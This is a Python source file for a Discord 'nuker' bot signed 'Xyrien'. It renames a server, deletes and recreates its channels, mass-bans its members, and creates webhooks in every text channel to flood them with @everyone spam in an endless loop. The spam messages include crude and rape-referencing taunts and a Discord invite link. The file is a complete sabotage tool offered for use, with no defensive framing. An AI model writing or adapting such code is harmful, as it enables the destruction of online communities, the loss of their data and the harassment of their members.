# Nuker V1
# By: Xyrien <3

import discord
from discord.ext import commands
import asyncio
import time
import random
from colorama import Fore, Back, Style, init
from channels import delchanny, crechanny
from massban import massban

red = Fore.RED
yellow = Fore.YELLOW
blue = Fore.BLUE
green = Fore.GREEN
magenta = Fore.MAGENTA
reset = Fore.RESET

embed = discord.Embed(title="OWNED BY XYRIEN+", description="[2KFUCKYOULOL](https://discord.gg/Cq5565XMP8)", color=0xFF0000)
ascii = """▒██   ██▒▓██   ██▓ ██▀███   ██▓▓█████  ███▄    █
▒▒ █ █ ▒░ ▒██  ██▒▓██ ▒ ██▒▓██▒▓█   ▀  ██ ▀█   █
░░  █   ░  ▒██ ██░▓██ ░▄█ ▒▒██▒▒███   ▓██  ▀█ ██▒
 ░ █ █ ▒   ░ ▐██▓░▒██▀▀█▄  ░██░▒▓█  ▄ ▓██▒  ▐▌██▒
▒██▒ ▒██▒  ░ ██▒▓░░██▓ ▒██▒░██░░▒████▒▒██░   ▓██░
▒▒ ░ ░▓ ░   ██▒▒▒ ░ ▒▓ ░▒▓░░▓  ░░ ▒░ ░░ ▒░   ▒ ▒
░░   ░▒ ░ ▓██ ░▒░   ░▒ ░ ▒░ ▒ ░ ░ ░  ░░ ░░   ░ ▒░
 ░    ░   ▒ ▒ ░░    ░░   ░  ▒ ░   ░      ░   ░ ░
 ░    ░   ░ ░        ░      ░     ░  ░         ░
          ░ ░
"""

xyri = commands.Bot(command_prefix='.!', intents=discord.Intents.all())

print(Fore.RED + ascii)
token = input(f"{red}Bot Token > {reset}")

@xyri.event
async def on_ready():
    print(f"{red}[@] Welcome to Xyrien's bot nuker.{reset}")
    print(f"{yellow}[/] Commands:{reset}")
    print("> xyrien : Nuke the server")
    print("> astral : Massban members")
    print("> alert : creating shit ton of webhooks")
    print(f"{blue}[_] Prefix: .!{reset}")
    print(f"{magenta}[!] Be responsible of your action!{reset}")
    print("> :3 :D :v :) :( >:) OwO >:3 >:( >:D D: <")

@xyri.command()
async def ping(ctx):
    await ctx.send('> {0}'.format(round(bot.latency, 1)))

@xyri.command()
async def xyrien(ctx):
    await ctx.guild.edit(community=False, name="{xy} FUCKED BY XYRIEN {xy}")
    print(f"{yellow}[!] NUKE INITIATED")

    guild = ctx.guild
    await delchanny(guild)
    await asyncio.sleep(0.29)
    await crechanny(guild)
    await asyncio.sleep(0.27)

@xyri.command()
async def astral(ctx, *, reason="No provided reason"):
    guild = ctx.guild
    try:
        await massban(guild, reason)
        print(f"{yellow}[!] Banned a member.{reset}")
    except Exception as e:
        print(f"{red}[!!!] FATAL ERROR: {e}{reset}")

# Separator

async def create_webhook(channel):
    try:
        webhook = await channel.create_webhook(name="xyrie :3")
        print(Fore.BLUE + f"[+] Webhook created in {channel.name}")
        return webhook
    except Exception as e:
        print(Fore.RED + f"[-] Fatal error occurred: {e}")
        return None

async def send_message(webhook):
    try:
        msg = """@everyone @here
        ```
        Hacker alert!
        ```
        Raped by XyRien. ;)"""
        await webhook.send(content=msg, embed=embed)
        print(Fore.YELLOW + f"[+] Successfully sent message to webhook in: {webhook.channel.name}")
    except Exception as e:
        print(Fore.RED + f"[X] Fatal error occurred: {e}")

@xyri.command()
async def webber1(ctx):

    webhooks = []

    for channel in ctx.guild.text_channels:
        webhook = await create_webhook(channel)
        if webhook:
            webhooks.append(webhook)

    try:
        while True:
            tasks = []
            for webhook in webhooks:
                tasks.append(send_message(webhook))

            await asyncio.gather(*tasks)
            await asyncio.sleep(0.30)
    except Exception as e:
        print(Fore.RED + f"[X] Fatal error occurred: {e}")

xyri.run(token)
